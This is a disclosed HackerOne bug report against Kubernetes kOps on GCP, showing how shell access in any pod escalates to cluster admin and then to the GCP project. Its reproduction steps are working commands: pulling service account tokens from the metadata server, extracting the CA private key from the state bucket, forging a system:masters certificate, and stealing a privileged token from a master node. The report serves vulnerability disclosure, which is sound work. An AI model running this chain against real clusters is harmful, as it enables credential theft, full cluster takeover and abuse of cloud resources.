# Privilege Escalation in kOps using GCE/GCP Provider

## Report Details
- **Report ID**: 1842829
- **URL**: https://hackerone.com/reports/1842829
- **State**: Closed
- **Severity**: high
- **Submitted**: 2023-01-22T00:39:36.189Z
- **Disclosed**: 2023-08-04T19:24:50.539Z

## Reporter
- **Username**: jpts
- **Name**: N/A

## Team
- **Name**: N/A
- **Handle**: kubernetes

## Vulnerability Information
## Summary:
When using kOps with the GCP provider, it is possible for a user with shell access to any pod, to escalate their privileges to cluster admin. During provisioning of the cluster, kOps gives all nodes access to the state storage bucket through the service account associated with the instance. Any user with shell access can request the service account credentials, and read sensitive information from the state store. Using this information, the user can privesc to cluster admin, compromising the entire cluster. It is further possible to compromise a privileged GCP service account associated with the control-plane nodes and takeover other resources in the GCP project.

## Kubernetes Version:
Kubernetes: v1.25.5

## Component Version:
kOps: v1.25.3

## Steps To Reproduce:
### Cluster Setup:

The test cluster was setup as close to the [getting started](https://kops.sigs.k8s.io/getting_started/gce/) guide as possible.
```bash
export KOPS_STATE_STORE=gs://kops-state-test/
export PROJECT=`gcloud config get-value project`

gsutil mb $KOPS_STATE_STORE
kops create cluster kops.k8s.local --zones europe-west1-b --state ${KOPS_STATE_STORE} --project=$PROJECT --master-size=n1-standard-2 --node-size=n1-standard-2
kops update cluster --name kops.k8s.local --yes --admin
kops validate cluster --wait 10m
```
### Privesc
  1. Add a demo container in which user is allow shell access (manifest attached):
  `k apply -f shell.yaml`
  2. Give ourselves a shell:
  `k exec -it shell-5d64dd647c-8l8s6 -it -- ash`
  3. Grab the service account token and state bucket name
  ```
  pod$ wget --header 'Metadata-Flavor: Google' http://metadata.google.internal/computeMetadata/v1/instance/service-accounts/default/token -O default.token
  pod$ wget --header 'Metadata-Flavor: Google' http://metadata.google.internal/computeMetadata/v1/instance/attributes/startup-script -O- | grep ConfigBase
  ```
  4. Copy file back to the host
  ```
  k cp shell-5d64dd647c-8l8s6:/default.token default.token
  ```
  5.  Ensure normal gcloud auth not in use and set token environment var
  ```
  gcloud auth revoke
  export CLOUDSDK_AUTH_ACCESS_TOKEN=$(jq .access_token -r ./default.token)
  ```
  6. Grab the kubernetes CA keys
  ```
  mkdir -p keys
  gcloud storage cat gs://kops-state-test/kops.k8s.local/pki/private/kubernetes-ca/keyset.yaml | yq e '.spec.keys[0].privateMaterial' - | base64 -d > keys/ca.key
  gcloud storage cat gs://kops-state-test/kops.k8s.local/pki/private/kubernetes-ca/keyset.yaml | yq e '.spec.keys[0].publicMaterial' - | base64 -d > keys/ca.pem
  ```
  7. Generate system:masters cert (csr.json template attached)
  ```
  cd keys
  cfssl gencert -ca=ca.pem -ca-key=ca.key -profile=kubernetes csr.json | cfssljson -bare user
  ```
  8. Construct new kubeconfig
  ```
  export KUBECONFIG=./pwn.kconfig
  k config set-credentials pwn --client-certificate=user.pem --client-key=user-key.pem
  k config set-cluster kops --certificate-authority=ca.pem --server=https://<kops-ip>
  k config set-context pwn@kops --cluster=kops --user=pwn
  k config use-context pwn@kops
  ```
  9. Check we are cluster-admin
  `k auth can-i '*' '*' -A`
  10. Deploy a pod on the master node (example manifest included), make sure to edit to the correct node name
  `k apply -f shell-master.yaml`
  11. Give ourselves a shell:
  `k exec -it shell-78d66f6f7c-ft7ch -it -- ash`
  12. Grab the privileged GCP service account token
  ```
  pod$ wget --header 'Metadata-Flavor: Google' http://metadata.google.internal/computeMetadata/v1/instance/service-accounts/default/token -O admin.token
  ```
 13. Copy the token back to our host
  ```
  k cp shell-78d66f6f7c-ft7ch:/admin.token admin.token
  ```
  14. Set our credentials
  ```
  export CLOUDSDK_AUTH_ACCESS_TOKEN=$(jq .access_token -r ./admin.token)
  ```
  15. Run a cryptominer ....
  ```
  gcloud compute instances create miner --image-family=ubuntu-2204-lts --zone=europe-west1-b --image-project=ubuntu-os-cloud
  ```

## Supporting Material/References:
  * shell.yaml - basic alpine deployment to simulator a user with shell access
  * shell-master.yaml - similar simple deployment, targeting a master node
  * csr.json - used to configure cfssl to generate the malicious system:masters mTLS certs
  * auth-can-i.png - proof we have cluster admin
  * miner.png - proof we can spin up arbitrary instances
  * [Kubernetes Engine Service Agent Role](https://cloud.google.com/iam/docs/understanding-roles#container.serviceAgent)

## Tools used
 * https://github.com/cloudflare/cfssl
 * https://github.com/mikefarah/yq

## Impact

Once the attacker has compromised the cluster, they have access to all cluster resources. This includes any secrets/data stored by the cluster and also any secrets/data that is accessible by any GCP service accounts in use by the cluster. As the attacker is able to compromise the cluster, they can compromise the master nodes. In GCE kOps, the master node service accounts have the "Kubernetes Engine Service Agent" role, which is highly permissive, and would likely allow the compromise of other resources in the GCP project. Since the role has compute create permissions, it could also be abused for  attacks such as crypto-mining.

## Attachments
- auth-can-i.png
- shell.yaml
- csr.json
- miner.png
- shell-master.yaml
